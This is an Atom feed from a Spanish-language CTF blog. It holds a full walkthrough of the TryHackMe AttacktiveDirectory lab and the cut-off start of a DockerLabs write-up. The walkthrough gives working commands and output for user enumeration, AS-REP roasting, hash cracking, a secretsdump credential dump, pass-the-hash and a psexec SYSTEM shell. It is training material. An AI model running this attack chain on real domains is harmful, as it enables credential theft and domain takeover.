<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-12-27T20:56:22-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">TryHackMe - AttactiveDirectory (medium)</title><link href="http://localhost:4000/tryhackme/machines/medium/2024/12/27/ad.html" rel="alternate" type="text/html" title="TryHackMe - AttactiveDirectory (medium)" /><published>2024-12-27T00:00:00-06:00</published><updated>2024-12-27T00:00:00-06:00</updated><id>http://localhost:4000/tryhackme/machines/medium/2024/12/27/ad</id><content type="html" xml:base="http://localhost:4000/tryhackme/machines/medium/2024/12/27/ad.html"><![CDATA[<p align="center">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f38b047a2a7089147766099dffeb8a5d.png" />
</p>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p88</span>,135,139,389,464,593,3389,5985,47001,49664,49665,49667,49669,49672,49675,49676 10.10.161.28 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-27 20:17 CST
Nmap scan report <span class="k">for </span>10.10.161.28
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-12-27 19:54:18Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: spookysec.local0., Site: Default-First-Site-Name<span class="o">)</span>
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-27T19:55:16+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>AttacktiveDirectory.spookysec.local
| Not valid before: 2024-12-26T19:52:32
|_Not valid after:  2025-06-27T19:52:32
|_ssl-date: 2024-12-27T19:55:29+00:00<span class="p">;</span> <span class="nt">-6h23m28s</span> from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn<span class="s1">'t find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_clock-skew: mean: -6h23m29s, deviation: 1s, median: -6h23m30s
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vemos que estamos ante un Windows 10.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netexec smb 10.10.161.28
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span> <span class="o">(</span>domain:spookysec.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.161.28 spookysec.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.161.28 spookysec.local
</code></pre></div></div>

<ul>
  <li>De momento no vemos nada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-N</span> <span class="nt">-L</span> 10.10.161.28
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.161.28 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>
    <p>En el room mencionan el uso de <code class="language-plaintext highlighter-rouge">kerberos</code> así que vamos a usarlo para enumerar usuarios del Dominio <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a>.</p>
  </li>
  <li>
    <p>Vamos a usar un diccionario que contenga nombres de usuarios.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> spookysec.local <span class="nt">--dc</span> 10.10.161.28 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 12/27/24 - Ronnie Flathers @ropnop

2024/12/27 20:25:11 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/12/27 20:25:11 <span class="o">&gt;</span>  	10.10.161.28:88

2024/12/27 20:25:11 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       svc-admin@spookysec.local
2024/12/27 20:25:11 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 james@spookysec.local
2024/12/27 20:25:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 James@spookysec.local
2024/12/27 20:25:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 robin@spookysec.local
2024/12/27 20:25:36 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 darkstar@spookysec.local
2024/12/27 20:25:46 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 administrator@spookysec.local
2024/12/27 20:26:08 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 backup@spookysec.local
2024/12/27 20:26:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 paradox@spookysec.local
2024/12/27 20:27:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 JAMES@spookysec.local
</code></pre></div></div>

<ul>
  <li>Vamos agregarlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>users.txt
svc-admin
james
robin
darkstar
administrator
backup
paradox
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacer un <code class="language-plaintext highlighter-rouge">ASRPRoast Attack</code> ya que tenemos usuarios <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a>.</p>
  </li>
  <li>
    <p>Tenemos un hash.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt spookysec.local/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow<span class="o">()</span> is deprecated and scheduled <span class="k">for </span>removal <span class="k">in </span>a future version. Use timezone-aware objects to represent datetimes <span class="k">in </span>UTC: datetime.datetime.now<span class="o">(</span>datetime.UTC<span class="o">)</span><span class="nb">.</span>
  now <span class="o">=</span> datetime.datetime.utcnow<span class="o">()</span> + datetime.timedelta<span class="o">(</span><span class="nv">days</span><span class="o">=</span>1<span class="o">)</span>
<span class="nv">$krb5asrep$23$svc</span><span class="nt">-admin</span>@SPOOKYSEC.LOCAL:aa8759210952742c83330aad06aa9409<span class="nv">$e4a83c2507a6f8dc5518485920e7464080f1ed275d1b628c763e6d05700f2065f8e3bbc71a26fbc94fdbbf9cd988d6055ffa4a7b3c1d5b4277b18611629434c725b4ee316746322566eb784844c6ed9a1fb958b32e19bfcd890cc18a99b7b2c365bea11de398915b9e821bdd6805143923c2ea88823d05d484decc8f2eb18d5212d4eb993cb9d108df138754dd4297aa65569c7ffe8251684b9499d298c8627847924e6ffb05a042e092d985d2dd136277f1308967c1cbcbf583366c675e6b27809c67e5a8a7ac231e985078a936a6fe3b3b6d8e43c37f2ec6b73684cf634036137666a7ca84fbc2ef831218db1a9374ae3d</span>
<span class="o">[</span>-] User james doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User darkstar doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User backup doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</code></pre></div></div>

<ul>
  <li>Vamos a crackearlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
management2005   <span class="o">(</span><span class="nv">$krb5asrep$23$svc</span><span class="nt">-admin</span>@SPOOKYSEC.LOCAL<span class="o">)</span>     
1g 0:00:00:09 DONE <span class="o">(</span>2024-12-27 20:30<span class="o">)</span> 0.1071g/s 625704p/s 625704c/s 625704C/s manaia05..man3333
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre></div></div>

<ul>
  <li>Como tenemos credenciales podemos enumerar por smb.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netexec smb 10.10.161.28 <span class="nt">-u</span> svc-admin <span class="nt">-p</span> management2005 <span class="nt">--shares</span>
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span> <span class="o">(</span>domain:spookysec.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span>+] spookysec.local<span class="se">\s</span>vc-admin:management2005
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
SMB         10.10.161.28    445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.161.28    445    ATTACKTIVEDIREC  ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.161.28    445    ATTACKTIVEDIREC  backup          READ            
SMB         10.10.161.28    445    ATTACKTIVEDIREC  C<span class="nv">$ </span>                             Default share
SMB         10.10.161.28    445    ATTACKTIVEDIREC  IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.161.28    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share
SMB         10.10.161.28    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos a <code class="language-plaintext highlighter-rouge">backup</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.161.28/backup <span class="nt">-U</span> svc-admin <span class="nt">--password</span> management2005
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sat Apr  4 13:08:39 2020
  ..                                  D        0  Sat Apr  4 13:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 13:08:53 2020

		8247551 blocks of size 4096. 3564729 blocks available
smb: <span class="se">\&gt;</span> 
</code></pre></div></div>

<ul>
  <li>Vamos a descargar eso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get backup_credentials.txt 
getting file <span class="se">\b</span>ackup_credentials.txt of size 48 as backup_credentials.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Esta en base64 pero al decodear es una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
backup@spookysec.local:backup2517860  
</code></pre></div></div>

<ul>
  <li>Vemos que son validas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netexec smb 10.10.161.28 <span class="nt">-u</span> backup <span class="nt">-p</span> backup2517860
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span> <span class="o">(</span>domain:spookysec.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span>+] spookysec.local<span class="se">\b</span>ackup:backup2517860 
</code></pre></div></div>

<ul>
  <li>Si nos vamos al <code class="language-plaintext highlighter-rouge">Task 7</code> nos dice que usemos <code class="language-plaintext highlighter-rouge">secretsdump.py</code> y nos dan la siguiente información útil.</li>
</ul>

<blockquote>
  <p>Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account “backup” gets us thinking. What is this the backup account to? Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes Knowing this, we can use another tool within Impacket called “secretsdump.py”. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-secretsdump WORKGROUP/backup:backup2517860@10.10.161.28
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local<span class="se">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local<span class="se">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local<span class="se">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local<span class="se">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local<span class="se">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local<span class="se">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local<span class="se">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local<span class="se">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local<span class="se">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local<span class="se">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local<span class="se">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local<span class="se">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local<span class="se">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:b0d3f50f1016da643c34d840ad4af261:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local<span class="se">\s</span>kidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local<span class="se">\s</span>kidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local<span class="se">\s</span>kidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local<span class="se">\b</span>reakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local<span class="se">\b</span>reakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local<span class="se">\b</span>reakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local<span class="se">\j</span>ames:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local<span class="se">\j</span>ames:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local<span class="se">\j</span>ames:des-cbc-md5:dc971f4a91dce5e9
spookysec.local<span class="se">\o</span>ptional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local<span class="se">\o</span>ptional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local<span class="se">\o</span>ptional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local<span class="se">\s</span>herlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local<span class="se">\s</span>herlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local<span class="se">\s</span>herlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local<span class="se">\d</span>arkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local<span class="se">\d</span>arkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local<span class="se">\d</span>arkstar:des-cbc-md5:758af4d061381cea
spookysec.local<span class="se">\O</span>ri:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local<span class="se">\O</span>ri:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local<span class="se">\O</span>ri:des-cbc-md5:1c8f79864654cd4a
spookysec.local<span class="se">\r</span>obin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local<span class="se">\r</span>obin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local<span class="se">\r</span>obin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local<span class="se">\p</span>aradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local<span class="se">\p</span>aradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local<span class="se">\p</span>aradox:des-cbc-md5:83988983f8b34019
spookysec.local<span class="se">\M</span>uirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local<span class="se">\M</span>uirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local<span class="se">\M</span>uirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local<span class="se">\h</span>orshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local<span class="se">\h</span>orshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local<span class="se">\h</span>orshark:des-cbc-md5:a823497a7f4c0157
spookysec.local<span class="se">\s</span>vc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local<span class="se">\s</span>vc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local<span class="se">\s</span>vc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local<span class="se">\b</span>ackup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local<span class="se">\b</span>ackup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local<span class="se">\b</span>ackup:des-cbc-md5:d601e9469b2f6d89
spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC<span class="nv">$:</span>aes256-cts-hmac-sha1-96:2e25b4c046667051ea9bebf92b92767970d483b2f83f07770a0e7b05dc3fee26
ATTACKTIVEDIREC<span class="nv">$:</span>aes128-cts-hmac-sha1-96:0f2ab043451fb33305099592a4bb08d9
ATTACKTIVEDIREC<span class="nv">$:</span>des-cbc-md5:43750b80807a3d02
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
</code></pre></div></div>

<ul>
  <li>Ahora tenemos el hash <code class="language-plaintext highlighter-rouge">nt</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> que es el mas importante vamos a comprobar si es valido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netexec smb 10.10.161.28 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 0e0363213e37b94221497260b0bcb4fc
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span> <span class="o">(</span>domain:spookysec.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span>+] spookysec.local<span class="se">\A</span>dministrator:0e0363213e37b94221497260b0bcb4fc <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Nos conectamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-psexec WORKGROUP/Administrator@10.10.161.28 <span class="nt">-hashes</span> :0e0363213e37b94221497260b0bcb4fc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.161.28.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file OhcqNVZU.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.161.28.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Sram on 10.10.161.28.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Sram.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1490]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
The system cannot find the file specified.
Error occurred <span class="k">while </span>processing: type.

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt


TryHackMe<span class="o">{</span>4ctiveD1rectoryM4st3r<span class="o">}</span>
C:<span class="se">\U</span>sers&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="TryHackMe/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">DockerLabs - SummerVibes (hard)</title><link href="http://localhost:4000/dockerlabs/machines/hard/2024/12/09/SummerVibes.html" rel="alternate" type="text/html" title="DockerLabs - SummerVibes (hard)" /><published>2024-12-09T00:00:00-06:00</published><updated>2024-12-09T00:00:00-06:00</updated><id>http://localhost:4000/dockerlabs/machines/hard/2024/12/09/SummerVibes</id><content type="html" xml:base="http://localhost:4000/dockerlabs/machines/hard/2024/12/09/SummerVibes.html"><![CDATA[<p align="center">
<img src="/assets/DockerLabs/SummerVibes/1.png" />
</p>

<ul>
  <li>Esta Máquina es de la plataforma de DockerLabs <a href="https://dockerlabs.es/">https://dockerlabs.es/</a> en mi opinión es fácil pero esta catalogada como difícil.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 172.17.0.2 <span class="nt">-oN</span> targeted
